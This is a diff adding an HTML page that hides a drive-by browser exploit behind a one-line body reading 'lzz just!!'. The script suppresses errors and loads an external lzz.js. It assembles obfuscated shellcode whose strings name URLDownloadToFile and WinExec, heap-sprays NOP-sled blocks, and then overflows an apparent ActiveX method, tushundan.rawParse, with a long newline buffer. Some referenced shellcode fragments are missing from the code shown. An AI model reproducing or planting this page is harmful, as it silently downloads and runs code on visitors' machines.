@@ -1,0 +1,64 @@
+<html>
+<body>
+lzz just!!
+</body>
+<script>window.onerror=function(){return true;}</script>
+<script src=lzz.js></script>
+<body>
+<SCRIPT language="javascript"> 
+var pksoft2=unescape("%uefe9%u0000%u5a00%ua164%u0030%u0000%u408b%u8b0c%u1c70%u8bad%u0840");
+var pksoft5=unescape("%u59e9%u5e5f%ucd8b%u468b%u0324%ud1c3%u03e1%u33c1%u66c9%u088b%u468b");
+var pksoft16=unescape("%u6269%u6172%u7972%u0041%u7275%u6d6c%u6e6f%u5500%u4c52%u6f44%u6e77");
+var pksoft12=unescape("%uff58%u33d0%uacc0%uc085%uf975%u5251%u5356%ud2ff%u595a%ue2ab%u33ee");
+var pksoft3=unescape("%ud88b%u738b%u8b3c%u1e74%u0378%u8bf3%u207e%ufb03%u4e8b%u3314%u56ed");
+var pksoft11=unescape("%u50c0%u5350%u5056%u57ff%u8bfc%u6adc%u5300%u57ff%u68f0%u2451%u0040");
+var pksoft8=unescape("%u0057%u0000%uc683%u5613%u8046%u803e%ufa75%u3680%u5e80%uec83%u8b40");
+var pksoft7=unescape("%u5904%u6ae8%u0000%u8300%u0dc6%u5652%u57ff%u5afc%ud88b%u016a%ue859");
+var pksoft13=unescape("%uc3c0%u0ce8%uffff%u47ff%u7465%u7250%u636f%u6441%u7264%u7365%u0073");
+var pksoft15=unescape("%u456e%u6578%u0063%u7845%u7469%u6854%u6572%u6461%u4c00%u616f%u4c64");
+var weizao2="oo1";
+var xx2="90";
+var weizao1="oo2";
+var xx3="90";
+var weizao3="oo3";
+var xx1="%u";
+xxx = xx1+xx2+xx3;
+var pksoft1=unescape(xxx);
+var weizao5="hehe";
+
+
+lzzshell = pksoft1+pksoft1+pksoft2+pksoft3+pksoft4+pksoft5+pksoft6+pksoft7+pksoft8+pksoft9+pksoft10+pksoft11+pksoft12+pksoft13+pksoft14+pksoft15+pksoft16+pksoft17+pksoft18;
+
+
+var justopen = pksoft1+pksoft1;
+var justnop="ebx";
+var justopen2 = 20;
+var justnop="ecx";
+var justopen3 = justopen2+lzzshell.length;
+var justnop="esi";
+while (justopen.length<justopen3) justopen+=justopen;
+didiao = justopen.substring(0, justopen.length-justopen3);
+tuzizong = justopen.substring(0, justopen3);
+while(didiao.length+justopen3<0x40000) didiao = didiao+didiao+tuzizong;
+justxxxxx = new window["Array"]();
+for (x=0; x<300; x++) justxxxxx[x] = didiao + lzzshell;
+var juststop = '';
+while (juststop.length < 4057) 
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a";
+juststop+="\x0a\x0a";
+tushundan.rawParse(juststop);
+</script>
+</body>
+</html>
